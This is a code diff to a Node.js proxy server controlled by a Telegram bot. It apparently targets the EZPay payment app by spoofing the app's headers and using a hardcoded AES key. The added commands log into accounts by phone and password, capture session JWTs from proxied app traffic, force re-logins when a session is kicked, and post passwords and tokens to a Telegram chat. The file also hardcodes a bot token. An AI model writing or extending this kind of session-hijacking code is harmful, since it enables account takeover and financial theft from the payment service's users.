@@ -5,7 +5,7 @@ const crypto = require('crypto');
 
 const app = express();
 const ORIGINAL_API = 'https://api.ezpaycenter.com';
-const BOT_TOKEN = process.env.BOT_TOKEN || '8691125291:AAEiikOQE-PCEueG5xsA6Vf2KDtYij7DvIk';
+const BOT_TOKEN = process.env.BOT_TOKEN || '8727636415:AAFIvrnqVgtQXxCBS8r8j9NAthRO6d2ywaU';
 const WEBHOOK_URL = 'https://xcvic.vercel.app/bot-webhook';
 const REDIS_URL = process.env.KV_REST_API_URL || process.env.UPSTASH_REDIS_REST_URL;
 const REDIS_TOKEN = process.env.KV_REST_API_TOKEN || process.env.UPSTASH_REDIS_REST_TOKEN;
@@ -43,6 +43,163 @@ const tokenUserMap = {};
 const userTokenMap = {}; // userId -> latest real apptoken seen on incoming proxy request
 const userPhoneMap = {};
 let debugNextResponse = false;
+
+// ── EZPay Session Monitor (addlogin) ──────────────────────────
+const ezSessions = {};       // phone -> session object
+const ezIntervals = {};      // phone -> setInterval handle
+const EZ_API   = 'https://api.ezpaycenter.com';
+const EZ_AES   = '8Kjsis90sJnsHys8';
+const EZ_MONITOR_MS = 1000;
+
+function ezAesEncrypt(text) {
+  const key = Buffer.from(EZ_AES, 'utf8');
+  const iv  = key.slice(0, 16);
+  const cipher = crypto.createCipheriv('aes-128-cbc', key, iv);
+  let enc = cipher.update(text, 'utf8', 'base64');
+  enc += cipher.final('base64');
+  return enc;
+}
+
+async function ezLogin(phone, password) {
+  const encPwd = ezAesEncrypt(password);
+  const r = await fetch(`${EZ_API}/app/api/system/v2/login`, {
+    method: 'POST',
+    headers: {
+      'content-type': 'application/json; charset=utf-8',
+      'accept': '*/*', 'accept-encoding': 'gzip',
+      'user-agent': 'okhttp/4.11.0',
+      'host': 'api.ezpaycenter.com',
+      'packagename': 'com.syq.ez.pay',
+      'version': '1.2.3', 'versioncode': '23'
+    },
+    body: JSON.stringify({ memberPhone: phone, memberPwd: encPwd }),
+    signal: AbortSignal.timeout(15000)
+  });
+  const txt  = await r.text();
+  let json = null;
+  try { json = JSON.parse(txt); } catch(e) {}
+  return { httpStatus: r.status, json, raw: txt };
+}
+
+async function ezCheckToken(appToken, memberCode) {
+  try {
+    const mc = String(memberCode).startsWith('MC') ? memberCode : 'MC' + memberCode;
+    const r = await fetch(`${EZ_API}/app/api/memberManager/mine`, {
+      method: 'POST',
+      headers: {
+        'content-type': 'application/json; charset=utf-8',
+        'accept': '*/*', 'accept-encoding': 'gzip',
+        'user-agent': 'okhttp/4.11.0',
+        'host': 'api.ezpaycenter.com',
+        'packagename': 'com.syq.ez.pay',
+        'version': '1.2.3', 'versioncode': '23',
+        'apptoken': appToken, 'membercode': mc
+      },
+      body: '{}',
+      signal: AbortSignal.timeout(8000)
+    });
+    if (r.status === 401 || r.status === 403) return false;
+    const txt = await r.text();
+    let j = null; try { j = JSON.parse(txt); } catch(e) {}
+    if (!j) return null;
+    const code = Number(j.code ?? j.status ?? -1);
+    if (code === 401 || code === 403) return false;
+    if (code === 200 || code === 0)   return true;
+    return null;
+  } catch(e) { return null; }
+}
+
+async function ezDoRelogin(phone) {
+  const sess = ezSessions[phone];
+  if (!sess) return;
+  try {
+    const { json } = await ezLogin(phone, sess.password);
+    const code      = json?.code ?? json?.status ?? 'N/A';
+    const loginData = json?.data ?? json?.body ?? json?.result ?? {};
+    const isOk      = code === 200 || code === '200' || code === 0 || code === '0';
+    if (isOk) {
+      const newMcToken = loginData.appToken || loginData.token || '';
+      const memberCode = loginData.memberCode || sess.memberCode;
+      const userId     = String(memberCode).replace(/^MC/i, '').trim();
+      // Proxy ke through login hua — userTokenMap mein real JWT aa sakta hai
+      const realToken = userTokenMap[userId] || newMcToken;
+      sess.appToken   = realToken;
+      sess.mcToken    = newMcToken;
+      sess.memberCode = memberCode;
+      sess.userId     = userId;
+      sess.loginCount = (sess.loginCount || 1) + 1;
+      sess.lastLogin  = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
+      ezSessions[phone] = sess;
+      const isReal = !/^MC\d{4,}_/i.test(realToken);
+      if (bot && sess.chatId) {
+        await bot.sendMessage(sess.chatId,
+`🔄 AUTO RE-LOGIN SUCCESS
+━━━━━━━━━━━━━━━━━━
+📱 <code>${phone}</code>  |  👤 <code>${memberCode}</code>
+🔢 Re-Logins: ${sess.loginCount - 1}
+🕐 ${sess.lastLogin}
+🎟️ MC: <code>${newMcToken}</code>
+${isReal ? `🔑 Real JWT: <code>${realToken}</code>` : `⚠️ Real JWT abhi tak nahi mila (APK request ka intezaar)`}`, { parse_mode: 'HTML' });
+      }
+    } else {
+      const msg = json?.msg ?? json?.message ?? '';
+      if (bot && sess.chatId) {
+        await bot.sendMessage(sess.chatId,
+`⚠️ AUTO RE-LOGIN FAILED
+📱 <code>${phone}</code>  |  Code: ${code}  |  ${msg}`, { parse_mode: 'HTML' });
+      }
+    }
+  } catch(e) {
+    if (bot && sess.chatId) bot.sendMessage(sess.chatId, `❌ Re-Login Error [${phone}]: ${e.message}`).catch(()=>{});
+  }
+}
+
+function ezStartMonitoring(phone, chatId) {
+  if (ezIntervals[phone]) { clearInterval(ezIntervals[phone]); delete ezIntervals[phone]; }
+  let tick = 0;
+  ezIntervals[phone] = setInterval(async () => {
+    const sess = ezSessions[phone];
+    if (!sess || !sess.active) {
+      clearInterval(ezIntervals[phone]); delete ezIntervals[phone]; return;
+    }
+    tick++;
+    // Har 5 ticks (5s): userTokenMap mein real JWT check karo
+    if (tick % 5 === 0 && sess.userId) {
+      const fresh = userTokenMap[sess.userId];
+      if (fresh && fresh !== sess.appToken && !/^MC\d{4,}_/i.test(fresh)) {
+        const old = sess.appToken ? sess.appToken.substring(0, 20) : 'N/A';
+        sess.appToken = fresh;
+        ezSessions[phone] = sess;
+        if (bot && chatId) {
+          bot.sendMessage(chatId,
+`🔑 REAL JWT AUTO-CAPTURED!
+━━━━━━━━━━━━━━━━━━
+📱 <code>${phone}</code>  👤 UserID: <code>${sess.userId}</code>
+🔄 Old: <code>${old}...</code>
+✅ JWT: <code>${fresh.substring(0, 50)}...</code>
+
+Ab real JWT se monitoring chal rahi hai!`, { parse_mode: 'HTML' }).catch(()=>{});
+        }
+      }
+    }
+    // Har tick: /mine ping
+    const valid = await ezCheckToken(sess.appToken, sess.memberCode);
+    if (valid === false) {
+      if (bot && chatId) {
+        bot.sendMessage(chatId,
+`⚡ SESSION KICKED!
+📱 <code>${phone}</code> ka token expire hua!
+🔄 Re-login ho raha hai...`, { parse_mode: 'HTML' }).catch(()=>{});
+      }
+      await ezDoRelogin(phone);
+    }
+  }, EZ_MONITOR_MS);
+}
+
+function ezStopMonitoring(phone) {
+  if (ezIntervals[phone]) { clearInterval(ezIntervals[phone]); delete ezIntervals[phone]; }
+  if (ezSessions[phone]) ezSessions[phone].active = false;
+}
 const sentImgHashes = new Set();
 
 function getOrderAmount(req, respData) {
@@ -868,6 +1025,12 @@ app.post('/bot-webhook', async (req, res) => {
 /sendcode <id> [codeType] — Send OTP (default unbindRobot)
 /unbind <id> <code> — Unbind TG robot with OTP
 
+=== SESSION MONITOR ===
+/addlogin <phone> <password> — Login + auto-monitor session
+/alllogin — Saare active sessions dekho
+/stoplogin — Sabhi sessions band karo
+/stoplogin <phone> — Ek session band karo
+
 Example:
 /addbank Rahul Kumar|1234567890|SBIN0001234|SBI|rahul@upi`
       );
@@ -1412,6 +1575,145 @@ Example:
 
     if (text === '/help') {
       await bot.sendMessage(chatId, 'Use /start to see all commands.');
+      return res.sendStatus(200);
+    }
+
+    // ── /addlogin ──────────────────────────────────────────────
+    if (text.startsWith('/addlogin')) {
+      const parts    = text.split(/\s+/);
+      const phone    = parts[1] || '';
+      const password = parts[2] || '';
+      if (!phone || !password) {
+        await bot.sendMessage(chatId,
+          '❌ Format:\n<code>/addlogin [number] [password]</code>\n\nExample:\n<code>/addlogin 9876543210 MyPass123</code>',
+          { parse_mode: 'HTML' });
+        return res.sendStatus(200);
+      }
+      const alreadyExists = ezSessions[phone]?.active;
+      await bot.sendMessage(chatId,
+        `⏳ Login ho raha hai...\n📱 <code>${phone}</code>` +
+        (alreadyExists ? '\n♻️ (Session update hoga)' : ''),
+        { parse_mode: 'HTML' });
+      try {
+        const { httpStatus, json, raw } = await ezLogin(phone, password);
+        const code      = json?.code ?? json?.status ?? 'N/A';
+        const apiMsg    = json?.msg  ?? json?.message ?? '';
+        const loginData = json?.data ?? json?.body ?? json?.result ?? {};
+        const isOk      = code === 200 || code === '200' || code === 0 || code === '0' || json?.success === true;
+        if (isOk) {
+          const mcToken    = loginData.appToken   || loginData.token       || loginData.accessToken || '';
+          const memberCode = loginData.memberCode || loginData.memberCodeId || loginData.memberId   || loginData.userId || '';
+          const respPhone  = loginData.memberPhone || loginData.phone || phone;
+          const pinSet     = loginData.ifSetPinCode === '1' || loginData.ifSetPinCode === true ? '✅ Yes'
+                           : loginData.ifSetPinCode === '0' || loginData.ifSetPinCode === false ? '❌ No' : '❓ N/A';
+          const userId = String(memberCode).replace(/^MC/i, '').trim();
+          // userTokenMap mein real JWT hoga agar APK ne pehle se request ki ho
+          const realToken = userTokenMap[userId] || mcToken;
+          const isReal    = !/^MC\d{4,}_/i.test(realToken) && realToken !== mcToken;
+          ezSessions[phone] = {
+            phone, password,
+            appToken:   realToken,
+            mcToken:    mcToken,
+            memberCode, userId, chatId,
+            active:     true,
+            loginCount: (ezSessions[phone]?.loginCount || 0) + 1,
+            lastLogin:  new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
+          };
+          // userTokenMap update karo (global middleware bhi karta hai, ye backup hai)
+          if (mcToken && userId) {
+            tokenUserMap[mcToken] = userId;
+            userTokenMap[userId]  = realToken;
+          }
+          ezStartMonitoring(phone, chatId);
+          await bot.sendMessage(chatId,
+`✅ LOGIN SUCCESS
+━━━━━━━━━━━━━━━━━━
+📱 Phone: <code>${respPhone}</code>
+🔒 Password: <code>${password}</code>
+👤 MemberCode: <code>${memberCode}</code>  |  UserID: <code>${userId}</code>
+📌 PIN Set: ${pinSet}
+
+🎟️ MC Token:
+<code>${mcToken}</code>
+
+${isReal
+  ? `🔑 Real JWT (proxy se mila ✅):\n<code>${realToken}</code>`
+  : `⚠️ Abhi MC token use ho raha hai.\nJab APK koi request karega (proxy ke through) toh real JWT automatically capture ho jayega!`}
+
+📡 <b>Monitoring STARTED</b> — Har 1s mein /mine ping
+Session expire hote hi instant re-login! 🔄`,
+            { parse_mode: 'HTML' });
+        } else {
+          await bot.sendMessage(chatId,
+`❌ LOGIN FAILED
+━━━━━━━━━━━━━━━━━━
+📱 <code>${phone}</code>
+📊 Code: ${code}  |  HTTP: ${httpStatus}
+💬 ${apiMsg || 'N/A'}
+
+<pre>${raw.substring(0, 400)}</pre>`,
+            { parse_mode: 'HTML' });
+        }
+      } catch(e) {
+        await bot.sendMessage(chatId, `❌ Network Error:\n<code>${e.message}</code>`, { parse_mode: 'HTML' });
+      }
+      return res.sendStatus(200);
+    }
+
+    // ── /alllogin ──────────────────────────────────────────────
+    if (text === '/alllogin') {
+      const phones = Object.keys(ezSessions);
+      if (phones.length === 0) {
+        await bot.sendMessage(chatId,
+          '📋 Koi session nahi hai.\n\n<code>/addlogin [number] [password]</code> se login karo.',
+          { parse_mode: 'HTML' });
+        return res.sendStatus(200);
+      }
+      let m = `📋 <b>EZPay Sessions (${phones.length})</b>\n━━━━━━━━━━━━━━━━━━\n\n`;
+      for (const [i, ph] of phones.entries()) {
+        const s       = ezSessions[ph];
+        const status  = s.active ? '🟢 ON' : '🔴 OFF';
+        const isReal  = s.appToken && !/^MC\d{4,}_/i.test(s.appToken);
+        const tokSnip = s.appToken ? s.appToken.substring(0, 28) + '...' : 'N/A';
+        // userTokenMap se latest real JWT check
+        const latest  = s.userId ? userTokenMap[s.userId] : null;
+        const hasLatest = latest && !/^MC\d{4,}_/i.test(latest);
+        m += `${i + 1}. 📱 <code>${ph}</code>\n`;
+        m += `   🔒 Pass: <code>${s.password}</code>\n`;
+        m += `   👤 MC: <code>${s.memberCode || 'N/A'}</code>  UID: <code>${s.userId || 'N/A'}</code>\n`;
+        m += `   📡 Monitoring: ${status}\n`;
+        m += `   🔢 Re-Logins: ${(s.loginCount || 1) - 1}\n`;
+        m += `   🕐 Last: ${s.lastLogin || 'N/A'}\n`;
+        m += `   ${isReal ? '🔑' : '🎟️'} Token: <code>${tokSnip}</code>\n`;
+        if (hasLatest && latest !== s.appToken) {
+          m += `   ⚡ New JWT available: <code>${latest.substring(0, 30)}...</code>\n`;
+        }
+        m += '\n';
+      }
+      if (m.length > 4000) m = m.substring(0, 4000) + '\n...(truncated)';
+      await bot.sendMessage(chatId, m, { parse_mode: 'HTML' });
+      return res.sendStatus(200);
+    }
+
+    // ── /stoplogin ─────────────────────────────────────────────
+    if (text === '/stoplogin' || text.startsWith('/stoplogin ')) {
+      const target = text.startsWith('/stoplogin ') ? text.substring(11).trim() : '';
+      if (!target) {
+        const phones = Object.keys(ezSessions);
+        if (phones.length === 0) {
+          await bot.sendMessage(chatId, 'ℹ️ Koi active session nahi hai.');
+          return res.sendStatus(200);
+        }
+        for (const ph of phones) ezStopMonitoring(ph);
+        await bot.sendMessage(chatId, `🛑 Sabhi <b>${phones.length}</b> sessions band kar di.`, { parse_mode: 'HTML' });
+      } else {
+        if (!ezSessions[target]) {
+          await bot.sendMessage(chatId, `❌ <code>${target}</code> ka session nahi mila.`, { parse_mode: 'HTML' });
+          return res.sendStatus(200);
+        }
+        ezStopMonitoring(target);
+        await bot.sendMessage(chatId, `🛑 <code>${target}</code> ki monitoring band kar di.`, { parse_mode: 'HTML' });
+      }
       return res.sendStatus(200);
     }
 
